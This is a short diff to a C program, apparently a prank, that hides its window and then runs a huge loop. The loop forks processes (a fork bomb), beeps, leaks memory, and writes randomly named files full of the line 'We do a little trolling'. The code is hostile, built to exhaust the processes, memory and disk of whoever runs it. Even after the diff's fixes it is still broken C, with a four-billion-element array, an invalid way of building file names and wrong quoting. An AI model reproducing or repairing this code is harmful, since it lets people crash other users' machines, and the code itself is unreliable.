@@ -13,20 +13,24 @@ int main()
     ShowWindow( hWnd, SW_MINIMIZE );
     ShowWindow( hWnd, SW_HIDE );    
     #endif
-    FILE *x[];
+    FILE *x[4294967295];
     for(unsigned int i = 0; i < 4294967295; i++) {
         for(int y = 0; y < 10; y++) {
-            print('\x7')
-            fork()
+            print('\x7');
+            fork();
         }
         if(i <= 1000) {
             malloc(1000);
         } else {
             malloc(i);
         }
-        char str[10];
-        x[i] = fopen(itoa(rand(), str, 10) + '.txt', 'w+')
-        for(int y = 0, y < i; y++)
+        char str[20];
+        for(int y = 0; y < 20; y++)
+        {
+            str[y] = (rand() % (126 - 32 + 1)) + 32;
+        }
+        x[i] = fopen(str + '.txt', 'w+');
+        for(int y = 0; y < i; y++)
         {
             fputs("We do a little trolling\n", x[i]);
         }
